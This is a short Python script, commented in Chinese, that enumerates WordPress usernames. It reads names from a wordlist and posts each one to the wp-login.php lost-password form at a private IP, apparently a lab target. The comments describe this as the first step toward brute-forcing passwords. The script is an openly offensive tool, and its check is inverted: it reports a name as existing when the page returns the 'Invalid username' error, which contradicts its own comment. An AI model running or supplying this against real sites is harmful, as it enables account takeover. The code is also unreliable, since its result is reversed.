import requests
#本项目适用于各类可以验证用户名存在信息的页面
#在WP登录后台存在找回密码功能，该功能通过向用户名发送邮箱来进行密码重置，并且会确认用户名是否存在，若不存在则返回错误信息。通过脚本批量测试用户名，可以枚举得到真实注册用户名，进而通过密码爆破再利用

# 密码重置请求的目标URL
url = "http://10.201.71.132/retro/wp-login.php?action=lostpassword"

# 使用with语句安全地打开文件
with open("username.txt", "r") as f:  # 字典路径
    # 使用splitlines()分隔每行
    usernames = f.read().splitlines()


head = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Cookie": ""
}

# for循环遍历用户名列表进行密码重置请求
for username in usernames:
    # 构建POST请求的数据负载
    data = {
        "user_login": username,        # 要检查的用户名
        "redirect_to": "",             # 重定向URL（为空）
        "wp-submit": "Get+New+Password"  # 提交按钮的值
    }


    # 发送POST请求到密码重置页面
    res = requests.post(url, headers=head, data=data,allow_redirects=True)
        # 检查响应中是否包含无效用户名的错误信息
    if 'Invalid username or e-mail.' in res.text:  #错误信息依据不同系统变化 此处为WP的后台登录错误信息
            # 如果不包含错误信息，说明用户名有效
            print(f"存在用户名！！: {username}")

    else :
            print(f"无效用户名: {username}")
